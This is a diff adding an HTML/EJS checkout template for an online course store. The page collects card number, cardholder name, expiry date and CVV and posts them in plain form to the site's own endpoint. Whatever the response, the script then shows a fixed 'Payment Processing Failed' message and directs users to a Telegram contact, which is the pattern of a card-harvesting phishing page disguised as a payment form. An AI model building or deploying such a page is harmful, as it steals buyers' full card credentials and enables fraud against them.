@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Payment</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <h1>MAGIC OF ARYA</h1>
+                    <p class="tagline">The Sorcerer</p>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Payment Section -->
+    <section class="payment-section">
+        <div class="container">
+            <div class="payment-container">
+                <div class="payment-card">
+                    <!-- Course Info -->
+                    <div class="payment-course-info">
+                        <h2>
+                            <%= order.course.title %>
+                        </h2>
+                        <div class="payment-amount">₹<%= order.amount.toLocaleString() %>
+                        </div>
+                    </div>
+
+                    <!-- Card Payment Form -->
+                    <div class="card-payment-form">
+                        <h3>Enter Card Details</h3>
+                        <form id="cardForm" onsubmit="submitCardPayment(event)">
+                            <div class="form-group">
+                                <label for="cardNumber">Card Number</label>
+                                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456"
+                                    maxlength="19" required oninput="formatCardNumber(this)">
+                            </div>
+
+                            <div class="form-group">
+                                <label for="cardHolderName">Cardholder Name</label>
+                                <input type="text" id="cardHolderName" name="cardHolderName" placeholder="John Doe"
+                                    required>
+                            </div>
+
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="expiryDate">Expiry Date</label>
+                                    <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY"
+                                        maxlength="5" required oninput="formatExpiry(this)">
+                                </div>
+
+                                <div class="form-group">
+                                    <label for="cvv">CVV</label>
+                                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required
+                                        oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                                </div>
+                            </div>
+
+                            <button type="submit" class="btn-primary btn-large" id="submitBtn">
+                                Pay ₹<%= order.amount.toLocaleString() %>
+                            </button>
+                        </form>
+                    </div>
+
+                    <!-- Error Message (Hidden by default) -->
+                    <div id="errorMessage" class="card-error-message" style="display: none;">
+                        <div class="error-icon">⚠️</div>
+                        <h3>Payment Processing Failed</h3>
+                        <p>We encountered an error while processing your payment. Our team has been notified.</p>
+                        <div class="telegram-contact">
+                            <p><strong>Need Help?</strong></p>
+                            <p>Please contact our support team on Telegram:</p>
+                            <a href="https://t.me/course_marketer" target="_blank" class="telegram-link">
+                                <span class="telegram-icon">📱</span>
+                                @course_marketer
+                            </a>
+                        </div>
+                        <button onclick="window.location.href='/store'" class="btn-secondary">
+                            Return to Store
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        const orderId = '<%= order._id %>';
+
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            input.value = formattedValue;
+        }
+
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            input.value = value;
+        }
+
+        async function submitCardPayment(event) {
+            event.preventDefault();
+
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+
+            const formData = new FormData(event.target);
+            const cardData = {
+                orderId: orderId,
+                cardNumber: formData.get('cardNumber').replace(/\s/g, ''),
+                cardHolderName: formData.get('cardHolderName'),
+                expiryDate: formData.get('expiryDate'),
+                cvv: formData.get('cvv')
+            };
+
+            try {
+                const response = await fetch('/api/orders/card-payment', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(cardData)
+                });
+
+                const result = await response.json();
+
+                // Hide form and show error message
+                document.querySelector('.card-payment-form').style.display = 'none';
+                document.querySelector('.payment-course-info').style.display = 'none';
+                document.getElementById('errorMessage').style.display = 'block';
+
+            } catch (error) {
+                console.error('Card payment error:', error);
+                alert('An error occurred. Please try again.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Pay ₹' + '<%= order.amount.toLocaleString() %>';
+            }
+        }
+    </script>
+</body>
+
+</html>
